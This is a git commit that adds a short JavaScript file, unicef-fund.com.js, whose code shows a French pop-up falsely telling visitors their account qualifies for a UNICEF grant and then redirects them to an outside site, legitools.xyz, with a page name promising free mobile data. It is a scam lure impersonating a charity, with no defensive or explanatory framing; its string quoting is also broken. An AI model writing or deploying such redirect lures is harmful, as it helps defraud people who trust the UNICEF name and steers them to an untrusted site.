7878bb618ca89b3f000d13d45d5f0b1728cab570
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-11 17:56:47 -0800

    Create unicef-fund.com.js

---
+++ unicef-fund.com.js
@@ -0,0 +1,5 @@
+var password = 'Subvention de l'UNICEF'
+password=prompt('SMS: Félicitations, votre COMPTE est éligible pour recevoir une SUBVENTION DE L'UNICEF, veuillez appuyer sur OK pour vous INSCRIRE. ','Subvention de l'UNICEF');
+if (password != 'Subvention de l'UNICEF') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
